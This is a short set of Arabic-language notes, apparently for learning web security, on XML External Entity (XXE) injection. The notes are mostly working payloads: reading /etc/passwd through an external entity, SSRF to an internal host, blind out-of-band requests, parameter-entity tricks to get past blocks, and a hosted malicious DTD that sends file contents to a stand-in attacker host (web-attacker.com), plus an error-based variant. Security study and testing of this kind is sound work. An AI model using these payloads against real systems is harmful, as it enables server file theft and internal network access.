___
# الخلاصة

<iframe title="XML External Entities (XXE) Explained" src="https://www.youtube.com/embed/gjm6VHZa_8s?feature=oembed" height="113" width="200" style="aspect-ratio: 1.76991 / 1; width: 100%; height: 100%;" allowfullscreen="" allow="fullscreen"></iframe>

اي مكان تلاقيه بيستخدم XML جرب تحقن فيه XXE.
___


تقدر تقرأ ملفات ع السيرفر بالشكل دا:
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<stockCheck>
<productId>&xxe;</productId>
</stockCheck>
```

او تعمل SSRF Attack
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

وبالنسبة لل blind:
فيه اكتر من تكنيك

1. out-of-band (OAST)
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```
دي نفس فكرة ال blind SSRF بتعمل HTTP Request لل url دا

وفي بعض الاحيان ال ENTITY بيبقا معمول ليها بلوك والحل هيكون XML parameter entities وبيكون شكلها كالتالي:
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

==طب انا مش عاوز اعمل blind SSRF وعاوز اشوف ملفات ع السيرفر اعمل اي؟==
هنا انت محتاج تعمل ملف DTD عندك وتستدعيه في ال XML payload زي كدا مثلا:

attacker.dtd:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> 
%eval; 
%exfiltrate;
```
exploit poc:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

2. retrieve data via error messages

دا لو في حالة ان ال XML parser بيطلع error
external.dtd
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> 
%eval; 
%error;
```

exploit poc:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/external.dtd"> %xxe;]>
```